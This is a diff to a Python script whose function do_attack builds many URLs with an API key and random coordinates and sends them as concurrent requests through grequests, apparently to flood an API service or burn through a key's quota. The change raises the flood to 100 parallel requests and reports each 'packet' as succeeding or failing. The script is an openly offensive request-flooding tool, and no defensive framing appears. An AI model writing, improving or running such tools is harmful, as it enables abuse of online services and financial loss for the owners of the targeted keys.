@@ -4,7 +4,7 @@ from colorama import Fore
 colorama.init(autoreset=True)
 
 def exception_handler(request, exception):
-    print(Fore.RED + "Request Failed.")
+    print(Fore.RED + "Request Failed")
 
 def generate_url(apikey):
     lat_a = random.randrange(-89,90)
@@ -23,12 +23,15 @@ def do_attack():
         urls.append(url)
 
     responses = (grequests.get(u, timeout=5) for u in urls)
-    result_map = grequests.map(responses, exception_handler=exception_handler)
+    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
     for result in result_map:
-        if result.text.find("error") < 0:
-            print(Fore.GREEN + f"[+] Packet sequence-{result_map.index(result) + 1} Succeed: No Error Message")
+        if result is not None:
+            if result.text.find("error") < 0:
+                print(Fore.GREEN + f"[+] Packet Succeed: No Error Message")
+            else:
+                print(Fore.RED + f"[-] Packet Failed: Error Message Exist")
         else:
-            print(Fore.RED + f"[-] Packet sequence-{result_map.index(result) + 1} Failed: Error Message Exist")
+            print("[-] Packet Failed: Request Failed")
 
 if __name__ == "__main__":
     do_attack()
